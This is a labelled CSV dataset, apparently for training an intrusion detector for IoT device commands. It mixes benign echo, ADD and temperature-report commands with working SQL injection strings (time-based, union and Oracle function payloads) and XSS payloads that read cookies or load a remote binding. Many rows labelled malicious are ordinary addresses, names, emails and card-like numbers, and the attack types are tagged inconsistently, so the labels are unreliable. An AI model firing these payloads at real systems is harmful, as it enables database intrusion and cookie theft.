payload,label,attack_type
"run_cmd, echo ['safe', 'normal']",benign,norm
5181004596461757,malicious,cmd_parse_error
25g0a00,malicious,cmd_parse_error
"calle pintor picasso, 182 5?d",malicious,cmd_parse_error
"echo, ['ready']",benign,norm
84428224p,malicious,cmd_parse_error
hardin5,malicious,cmd_parse_error
"start_temp_report, 109",benign,norm
floriano,malicious,cmd_parse_error
calle corinto 108,malicious,cmd_parse_error
"echo, ['report']",benign,norm
alcalde manuel de la pinta s/n 13?f,malicious,cmd_parse_error
<script>a=/crosssitescripting/ document.cookie=true;</script>,malicious,xss
molina de aragn,malicious,cmd_parse_error
"echo, ['mqtt', 'payload', 'normal', 'report']",benign,norm
calle horreo 85 10?d,malicious,cmd_parse_error
"-1558 or elt(3306=2272,2272)-- ioxt",malicious,cmd_parse_error
"echo, ['mqtt', 'ok', 'normal']",benign,norm
"run_cmd, echo ['ping']",benign,norm
-6823'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('lwlk' like 'lwlk,malicious,cmdi
"echo, ['normal', 'data']",benign,norm
"start_temp_report, 57",benign,norm
dosenbac,malicious,cmd_parse_error
"echo, ['sensor', 'safe', 'esp32', 'status']",benign,norm
"run_cmd, echo ['ping', 'report', 'hello']",benign,norm
"run_cmd, echo ['iot', 'ok', 'mqtt', 'report']",benign,norm
"start_temp_report, 85",benign,norm
c/ rio segura 76,malicious,cmd_parse_error
"run_cmd, echo ['status', 'data']",benign,norm
swanick@deseoun.jm,malicious,cmd_parse_error
"echo, ['hello', 'ok', 'world']",benign,norm
"run_cmd, echo ['esp32', 'ready']",benign,norm
"run_cmd, echo ['status']",benign,norm
"run_cmd, ADD 582 381",benign,norm
pages@spainbb.kh,malicious,cmd_parse_error
"run_cmd, echo ['data']",benign,norm
barbieri guamanzara,malicious,cmd_parse_error
"-8129'))) union all select 4531,4531,4531#",malicious,cmd_parse_error
"-7806"")) or (8459=8459)*4906 and ((""vlrj"" like ""vlrj",malicious,cmd_parse_error
"run_cmd, ADD 147 123",benign,norm
"start_temp_report, 10",benign,norm
"start_temp_report, 60",benign,norm
"start_temp_report, 109",benign,norm
"run_cmd, echo ['data']",benign,norm
"run_cmd, ADD 280 723",benign,norm
bentos campins,malicious,cmd_parse_error
3291164782388110,malicious,cmd_parse_error
"run_cmd, echo ['ready', 'safe', 'iot']",benign,norm
"run_cmd, echo ['ping']",benign,norm
60142978w,malicious,cmd_parse_error
"echo, ['report', 'hello', 'safe', 'mqtt']",benign,norm
"1""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""fjwv"" like ""fjwv",malicious,cmd_parse_error
streit bellavista,malicious,cmd_parse_error
laguna de cameros,malicious,cmd_parse_error
-3880) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (5194=5194,malicious,cmdi
"1')) as agdn where 8442=8442 and 3824=benchmark(5000000,md5(0x76555642))--",malicious,cmd_parse_error
"echo, ['iot']",benign,norm
"calle batalla de otumba 26,",malicious,cmd_parse_error
"run_cmd, ADD 585 576",benign,norm
"echo, ['report', 'iot']",benign,norm
"start_temp_report, 80",benign,norm
"1"") and 3732=3850 and (""edjv""=""edjv",malicious,cmd_parse_error
"run_cmd, echo ['status', 'safe', 'sensor']",benign,norm
"start_temp_report, 64",benign,norm
"echo, ['mqtt']",benign,norm
piggott@firstchoicecoffee.gq,malicious,cmd_parse_error
"1)) as xutu where 5811=5811 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
"echo, ['system']",benign,norm
52382768s,malicious,cmd_parse_error
"1"") where 8407=8407 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,cmdi
romaguer,malicious,cmd_parse_error
"run_cmd, ADD 684 954",benign,norm
"run_cmd, echo ['mqtt', 'payload', 'data']",benign,norm
"run_cmd, echo ['normal', 'safe']",benign,norm
"run_cmd, ADD 665 618",benign,norm
scanell@clichotel.kw,malicious,cmd_parse_error
"run_cmd, ADD 436 15",benign,norm
"run_cmd, ADD 585 822",benign,norm
"start_temp_report, 62",benign,norm
"run_cmd, echo ['ready']",benign,norm
"echo, ['sensor', 'report', 'ready', 'world']",benign,norm
1438,malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'payload']",benign,norm
"run_cmd, ADD 179 658",benign,norm
bolvir,malicious,cmd_parse_error
"run_cmd, ADD 660 929",benign,norm
"start_temp_report, 68",benign,norm
"run_cmd, ADD 20 359",benign,norm
"1%"") and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,cmd_parse_error
"-4736')) or elt(5835=5509,5509) and (('iawg'='iawg",malicious,cmd_parse_error
"start_temp_report, 31",benign,norm
1) where 4992=4992;select case when 7717=7717 then 1 else null end--,malicious,cmdi
"echo, ['safe', 'device']",benign,norm
"run_cmd, echo ['report', 'hello']",benign,norm
"run_cmd, echo ['safe', 'report', 'world']",benign,norm
"<style>body{-moz-binding:url(""http://vulnerability-lab.com/crosssitescriptingmoz.xml#crosssitescripting"")}</style>",malicious,xss
"run_cmd, echo ['data', 'safe', 'iot', 'world']",benign,norm
"echo, ['iot']",benign,norm
boa4@sitienesunawebtienesunnegocio.es,malicious,cmd_parse_error
"run_cmd, ADD 923 90",benign,norm
"run_cmd, echo ['status', 'mqtt', 'ping', 'sensor']",benign,norm
32430,malicious,cmd_parse_error
"start_temp_report, 45",benign,norm
1')));select (case when (6969=5797) then 6969 else 6969*(select 6969 from information_schema.character_sets) end)#,malicious,cmdi
mauricio,malicious,cmd_parse_error
"echo, ['system', 'sensor', 'ready']",benign,norm
"run_cmd, echo ['system', 'status', 'data']",benign,norm
"start_temp_report, 15",benign,norm
hadjiyanev@fortelingenieria.sh,malicious,cmd_parse_error
sit agulla,malicious,cmd_parse_error
"echo, ['data', 'iot', 'ping']",benign,norm
"start_temp_report, 19",benign,norm
"echo, ['safe', 'ping', 'hello', 'ok']",benign,norm
04249968m,malicious,cmd_parse_error
"run_cmd, ADD 345 851",benign,norm
"run_cmd, echo ['ok', 'device', 'status', 'normal']",benign,norm
45516,malicious,cmd_parse_error
"run_cmd, echo ['ok']",benign,norm
1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('foop' like 'foop,malicious,cmdi
victoria de los angeles,malicious,cmd_parse_error
1317,malicious,cmd_parse_error
rius,malicious,cmd_parse_error
1%' and 6454=8348 and '%'=',malicious,cmd_parse_error
1')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('hbwk' like 'hbwk,malicious,cmdi
"1' and elt(1210=1210,sleep(5)) and 'pjrf'='pjrf",malicious,cmd_parse_error
villalobar de rioja,malicious,cmd_parse_error
"echo, ['ready']",benign,norm
"run_cmd, echo ['sensor']",benign,norm
"run_cmd, echo ['esp32', 'system']",benign,norm
-6202)) or 7845=1962--,malicious,cmd_parse_error
"start_temp_report, 25",benign,norm
"run_cmd, echo ['sensor']",benign,norm
"run_cmd, echo ['report']",benign,norm
1))) and 6358=6735,malicious,cmd_parse_error
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",malicious,cmdi
"run_cmd, ADD 88 633",benign,norm
bayuca,malicious,cmd_parse_error
"echo, ['system', 'hello']",benign,norm
"run_cmd, echo ['payload']",benign,norm
"run_cmd, echo ['esp32']",benign,norm
"start_temp_report, 78",benign,norm
"echo, ['iot']",benign,norm
"start_temp_report, 63",benign,norm
"start_temp_report, 29",benign,norm
"run_cmd, ADD 84 44",benign,norm
"run_cmd, echo ['system', 'device', 'world', 'mqtt']",benign,norm
"run_cmd, ADD 692 412",benign,norm
"run_cmd, ADD 793 460",benign,norm
"1'||(select 'svbf' where 7017=7017 or elt(6272=6272,sleep(5)))||'",malicious,cmdi
"start_temp_report, 73",benign,norm
"run_cmd, ADD 637 581",benign,norm
ekezian-wohlfeiler@cirugiaalbeiteria.lv,malicious,cmd_parse_error
"run_cmd, ADD 105 999",benign,norm
"echo, ['report', 'normal']",benign,norm
1;select sleep(5),malicious,cmdi
"start_temp_report, 38",benign,norm
music jaume isern 189,malicious,cmd_parse_error
"run_cmd, ADD 382 849",benign,norm
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'hvqt'='hvqt",malicious,cmdi
1%'))) or 4240=(select 4240 from pg_sleep(5))--,malicious,cmd_parse_error
bojanic-gidra-tolan@elcarritodelacompra.ma,malicious,cmd_parse_error
"run_cmd, ADD 898 622",benign,norm
"echo, ['report']",benign,norm
"run_cmd, ADD 780 604",benign,norm
"start_temp_report, 64",benign,norm
"run_cmd, ADD 596 17",benign,norm
"run_cmd, echo ['sensor', 'report', 'system', 'ready']",benign,norm
"start_temp_report, 86",benign,norm
nerpio,malicious,cmd_parse_error
"start_temp_report, 10",benign,norm
"1""))) and make_set(8403=8403,8899) and (((""uisi""=""uisi",malicious,cmd_parse_error
"run_cmd, ADD 550 264",benign,norm
"run_cmd, ADD 971 97",benign,norm
"start_temp_report, 109",benign,norm
"run_cmd, echo ['ok', 'report', 'ping']",benign,norm
31587,malicious,cmd_parse_error
condado de castilnovo,malicious,cmd_parse_error
5706258775201783,malicious,cmd_parse_error
03331390r,malicious,cmd_parse_error
"run_cmd, ADD 15 117",benign,norm
pr3caz,malicious,cmd_parse_error
"-1573"") union all select 3928,3928,3928,3928--",malicious,cmd_parse_error
"1' where 9241=9241 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,cmd_parse_error
montnchez,malicious,cmd_parse_error
"ausines, los",malicious,cmd_parse_error
"start_temp_report, 17",benign,norm
86913775h,malicious,cmd_parse_error
"run_cmd, echo ['ready', 'ok']",benign,norm
eu,malicious,cmd_parse_error
37428,malicious,cmd_parse_error
"run_cmd, ADD 479 734",benign,norm
"run_cmd, ADD 479 366",benign,norm
"run_cmd, ADD 941 372",benign,norm
"echo, ['sensor', 'ping', 'esp32']",benign,norm
"start_temp_report, 5",benign,norm
"run_cmd, ADD 135 428",benign,norm
"run_cmd, echo ['iot']",benign,norm
"marcelino suarez 39,",malicious,cmd_parse_error
"start_temp_report, 106",benign,norm
"run_cmd, ADD 421 300",benign,norm
"run_cmd, echo ['report', 'iot', 'mqtt', 'ok']",benign,norm
-8264%') order by 1#,malicious,cmd_parse_error
"-3767') as eefl where 8260=8260 union all select 8260,8260,8260,8260,8260,8260,8260#",malicious,cmd_parse_error
"start_temp_report, 50",benign,norm
"1"" where 7015=7015;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",malicious,cmdi
"-9659))) union all select 8665,8665,8665,8665,8665,8665,8665--",malicious,cmd_parse_error
"echo, ['data', 'ok', 'ping']",benign,norm
"run_cmd, ADD 462 102",benign,norm
"run_cmd, ADD 824 645",benign,norm
"start_temp_report, 37",benign,norm
"run_cmd, ADD 891 872",benign,norm
to2adora,malicious,cmd_parse_error
"-9150%'))) union all select 7057,7057,7057,7057,7057,7057,7057,7057--",malicious,cmd_parse_error
"run_cmd, echo ['system', 'iot', 'normal', 'world']",benign,norm
dehr,malicious,cmd_parse_error
oliver,malicious,cmd_parse_error
"start_temp_report, 83",benign,norm
"start_temp_report, 18",benign,norm
faustiniano,malicious,cmd_parse_error
anja,malicious,cmd_parse_error
hollywood.hausman@921.th,malicious,cmd_parse_error
"run_cmd, echo ['data', 'safe']",benign,norm
seurat1@sitcpla.ma,malicious,cmd_parse_error
"1"")) union all select null,null--",malicious,cmd_parse_error
begin if (5624=5624) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;,malicious,cmdi
"echo, ['world', 'safe', 'normal', 'device']",benign,norm
1')) and sleep(5)#,malicious,cmd_parse_error
romana,malicious,cmd_parse_error
4056lan0e,malicious,cmd_parse_error
"start_temp_report, 63",benign,norm
"run_cmd, echo ['esp32', 'device', 'payload', 'ok']",benign,norm
"run_cmd, echo ['ready']",benign,norm
48083550a,malicious,cmd_parse_error
"run_cmd, ADD 726 532",benign,norm
"run_cmd, ADD 775 507",benign,norm
guarrate,malicious,cmd_parse_error
"echo, ['payload']",benign,norm
"-7564') as nank where 8095=8095 union all select 8095,8095,8095--",malicious,cmd_parse_error
"run_cmd, echo ['data', 'ping', 'system']",benign,norm
"start_temp_report, 40",benign,norm
dirosario@errebebe.as,malicious,cmd_parse_error
08192,malicious,cmd_parse_error
14860,malicious,cmd_parse_error
espa7t4ro,malicious,cmd_parse_error
2663409898988215,malicious,cmd_parse_error
"run_cmd, ADD 22 56",benign,norm
37217,malicious,cmd_parse_error
"run_cmd, ADD 757 466",benign,norm
murcia,malicious,cmd_parse_error
"echo, ['hello', 'system', 'data']",benign,norm
9289,malicious,cmd_parse_error
magnin_arne@tiebreak.com.sr,malicious,cmd_parse_error
berni aizpuru,malicious,cmd_parse_error
"start_temp_report, 49",benign,norm
"echo, ['world']",benign,norm
"-1064' or make_set(6439=2937,2937) and 'qojd'='qojd",malicious,cmd_parse_error
2678503703599908,malicious,cmd_parse_error
"-9558"" where 7497=7497 or (2539=6484)*6484--",malicious,cmd_parse_error
tottenham@satellites.py,malicious,cmd_parse_error
"run_cmd, ADD 453 191",benign,norm
"echo, ['normal', 'ready', 'iot']",benign,norm
"run_cmd, echo ['iot', 'status']",benign,norm
5988,malicious,cmd_parse_error
"run_cmd, echo ['payload']",benign,norm
cha$9i74r0,malicious,cmdi
belmonte de gracin,malicious,cmd_parse_error
"run_cmd, ADD 296 389",benign,norm
"echo, ['ping', 'iot', 'esp32']",benign,norm
"echo, ['status', 'system', 'ok']",benign,norm
51518357j,malicious,cmd_parse_error
"1"") as nyzd where 5305=5305;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
-5152')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('jumr' like 'jumr,malicious,cmdi
"run_cmd, ADD 281 241",benign,norm
"echo, ['sensor', 'hello', 'payload', 'ok']",benign,norm
"start_temp_report, 63",benign,norm
"run_cmd, echo ['system']",benign,norm
nagel ordoes,malicious,cmd_parse_error
"run_cmd, echo ['data', 'report']",benign,norm
"run_cmd, ADD 639 363",benign,norm
cehegn,malicious,cmd_parse_error
forniele calmet,malicious,cmd_parse_error
veguos@schnapps.com.mn,malicious,cmd_parse_error
">""<script>alert(document.cookie)</script><div style=""1@gmail.com",malicious,xss
"1%' or elt(6272=6272,sleep(5)) and '%'='",malicious,cmd_parse_error
72981161e,malicious,cmd_parse_error
"start_temp_report, 51",benign,norm
"run_cmd, ADD 858 317",benign,norm
"run_cmd, echo ['payload', 'system', 'report', 'status']",benign,norm
pipiolo sandrini,malicious,cmd_parse_error
"start_temp_report, 77",benign,norm
"plza. mariano arregui canela 171,",malicious,cmd_parse_error
"start_temp_report, 53",benign,norm
h8r66o,malicious,cmd_parse_error
gras egovil,malicious,cmd_parse_error
"run_cmd, echo ['safe']",benign,norm
"1') where 1804=1804 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",malicious,cmd_parse_error
"start_temp_report, 51",benign,norm
"start_temp_report, 63",benign,norm
repulsivo,malicious,cmd_parse_error
"run_cmd, ADD 200 286",benign,norm
"start_temp_report, 53",benign,norm
"run_cmd, echo ['hello']",benign,norm
"1"")));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""ksip"" like ""ksip",malicious,cmdi
aforismo,malicious,cmd_parse_error
"run_cmd, ADD 491 731",benign,norm
"run_cmd, ADD 689 568",benign,norm
gorin.mccracken@evelin.am,malicious,cmd_parse_error
"run_cmd, echo ['status', 'ready', 'safe', 'sensor']",benign,norm
"1') where 9544=9544 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",malicious,cmd_parse_error
"echo, ['hello', 'world', 'payload', 'esp32']",benign,norm
"echo, ['ping', 'data', 'status', 'iot']",benign,norm
baix pallars,malicious,cmd_parse_error
"run_cmd, echo ['status']",benign,norm
"run_cmd, ADD 470 44",benign,norm
"run_cmd, echo ['iot']",benign,norm
"run_cmd, echo ['mqtt']",benign,norm
"-3415 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- jove",malicious,cmdi
llach mund,malicious,cmd_parse_error
"1"" where 5517=5517 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",malicious,cmdi
"1')) as cimd where 9608=9608;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
"-6076"")) or 8277=4757",malicious,cmd_parse_error
6467099706129021,malicious,cmd_parse_error
c/ rosario 192 2?b,malicious,cmd_parse_error
"run_cmd, ADD 903 582",benign,norm
nikolia,malicious,cmd_parse_error
"run_cmd, echo ['normal']",benign,norm
33300,malicious,cmd_parse_error
"run_cmd, echo ['mqtt', 'world']",benign,norm
"echo, ['report']",benign,norm
marty@telogis.mv,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'status', 'normal']",benign,norm
"start_temp_report, 60",benign,norm
"run_cmd, ADD 586 883",benign,norm
zorita de la frontera,malicious,cmd_parse_error
val do dubra,malicious,cmd_parse_error
"run_cmd, echo ['hello']",benign,norm
6343513594517926,malicious,cmd_parse_error
"run_cmd, echo ['mqtt', 'payload']",benign,norm
c/ doctor luis calandre 44,malicious,cmd_parse_error
"echo, ['device', 'ping']",benign,norm
"echo, ['report', 'payload']",benign,norm
5964,malicious,cmd_parse_error
-4023 or (8779=5716)*5716,malicious,cmd_parse_error
-1217'))) order by 1#,malicious,cmd_parse_error
"1"")));waitfor delay '0:0:5' and (((""lpeo""=""lpeo",malicious,cmdi
